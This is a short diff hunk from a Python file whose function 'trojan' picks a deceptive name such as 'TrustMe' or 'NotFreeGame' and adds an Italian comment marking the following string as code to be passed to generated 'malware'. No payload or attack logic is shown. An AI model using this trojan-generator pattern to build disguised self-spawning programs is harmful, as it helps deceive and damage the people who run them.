@@ -118,6 +118,7 @@ def trojan(hidden:bool=False, hide_children:bool=False)->None:
     names = ['Tseam', 'Witch', 'NotFreeGame', 'TrustMe']
     random_name = rand.choice(names)
 
+    # Questo è il codice che verrà passato ai "malware" generati 
     code = f"""
 import os
 import random as rand
